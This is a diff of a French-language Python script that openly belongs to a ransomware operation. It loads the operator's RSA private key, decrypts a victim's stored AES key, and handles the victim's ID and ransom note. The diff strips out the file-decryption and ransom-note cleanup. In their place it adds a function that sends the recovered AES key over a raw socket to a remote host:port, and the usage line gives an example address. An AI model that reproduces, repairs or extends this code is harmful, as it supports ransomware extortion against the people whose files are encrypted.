@@ -9,6 +9,8 @@ Exemple:
 
 import sys
 import os
+import socket
+import json
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -50,15 +52,25 @@ def decrypt_file(enc_path, aes_key):
     os.remove(enc_path)
     return original_path
 
+def send_aes_key(aes_key, target):
+    host, port = target.rsplit(":", 1)
+    payload = json.dumps({"aes_key": aes_key.hex()}).encode()
+    s = socket.socket()
+    s.connect((host, int(port)))
+    s.sendall(payload)
+    s.close()
+    print(f"[+] Clé AES envoyée à {target}")
+
 def main():
     if len(sys.argv) != 5:
-        print(f"Usage: {sys.argv[0]} <dossier> <victim_id> <private.pem> <key.hex>")
+        print(f"Usage: {sys.argv[0]} <victim_id> <private.pem> <key.hex> <target_ip:port>")
+        print(f"Ex:    {sys.argv[0]} FEAB3AA0 private.pem received_keys/FEAB3AA0.hex 10.0.0.2:7777")
         sys.exit(1)
 
-    directory   = sys.argv[1]
-    victim_id   = sys.argv[2]
-    privkey_path = sys.argv[3]
-    key_hex_path = sys.argv[4]
+    victim_id    = sys.argv[1]
+    privkey_path = sys.argv[2]
+    key_hex_path = sys.argv[3]
+    target       = sys.argv[4]
 
     print(f"[*] Chargement de la clé privée RSA...")
     private_key = load_private_key(privkey_path)
@@ -67,28 +79,9 @@ def main():
     with open(key_hex_path) as f:
         enc_key_hex = f.read()
     aes_key = decrypt_aes_key(private_key, enc_key_hex)
-    print(f"[+] Clé AES récupérée")
+    print(f"[+] Clé AES déchiffrée")
 
-    print(f"[*] Déchiffrement de {directory}...")
-    count = 0
-    for root, _, files in os.walk(directory):
-        for fname in files:
-            if not fname.endswith(".enc"):
-                continue
-            full_path = os.path.join(root, fname)
-            try:
-                original = decrypt_file(full_path, aes_key)
-                print(f"  [+] {fname} → {os.path.basename(original)}")
-                count += 1
-            except Exception as e:
-                print(f"  [!] Erreur sur {fname}: {e}")
-
-    # Supprime la note de rançon
-    note = os.path.join(directory, "README_DECRYPT.txt")
-    if os.path.exists(note):
-        os.remove(note)
-
-    print(f"\n[+] {count} fichier(s) déchiffré(s) avec succès")
+    send_aes_key(aes_key, target)
 
 if __name__ == "__main__":
     main()
